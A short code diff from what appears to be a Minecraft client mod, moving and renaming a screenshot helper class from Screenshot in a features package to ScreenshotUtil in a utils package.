@@ -1,4 +1,4 @@
-package me.soda.witch.features;
+package me.soda.witch.utils;
 
 import me.soda.witch.Witch;
 import net.minecraft.client.texture.NativeImage;
@@ -6,7 +6,7 @@ import net.minecraft.client.util.ScreenshotRecorder;
 
 import java.io.IOException;
 
-public class Screenshot {
+public class ScreenshotUtil {
     private static boolean screenshot = false;
 
     public static byte[] takeScreenshot() throws IOException {
